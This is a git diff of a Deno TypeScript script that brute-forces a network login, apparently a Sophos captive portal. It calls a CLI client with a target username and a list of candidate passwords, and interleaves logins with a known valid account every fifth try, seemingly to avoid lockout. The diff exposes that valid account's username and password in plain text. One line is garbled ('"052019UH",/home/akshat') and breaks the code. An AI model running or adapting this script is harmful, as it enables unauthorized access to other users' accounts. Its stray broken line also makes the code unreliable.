@@ -1,7 +1,7 @@
 const username_known = "9919103015";
 const password_known = "052019UH";
 
-const username_to_find = ""
+const username_to_find = "9919103003";
 
 const password_list: Array<string> = [
   "157030AR",
@@ -23,10 +23,7 @@ const password_list: Array<string> = [
   "063016UR",
   "417017AR",
   "053018BH",
-  "052019UH",
-  "420002HA",
-  "078003AR",
-  "079004OL",
+  "052019UH",/home/akshat
   "035005IS",
   "087006EH",
   "411007NU",
@@ -57,32 +54,32 @@ const password_list: Array<string> = [
   "199040AS"
 ];
 
-for (let i = 0; i < list.length; ) {
-  if (i + 1 % 5 == 0) {
-    const p = Deno.run({
+for (let i = 0; i < password_list.length; ) {
+  if ((i + 1) % 5 == 0) {
+    let p1 = Deno.run({
       args: [
-        "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
+        "$USER/projects/sophos-cli/target/debug/sophos-cli",
         username_known,
         password_known,
         "login"
       ]
     });
     // await its completion
-    await p.status();
-    const p = Deno.run({
+    await p1.status();
+    let p2 = Deno.run({
       args: [
-        "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
+        "$USER/projects/sophos-cli/target/debug/sophos-cli",
         username_known,
         password_known,
         "logout"
       ]
     });
     // await its completion
-    await p.status();
+    await p2.status();
   } else {
-    const p = Deno.run({
+    let p = Deno.run({
       args: [
-        "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
+        "$USER/projects/sophos-cli/target/debug/sophos-cli",
         username_to_find,
         password_list[i],
         "login"
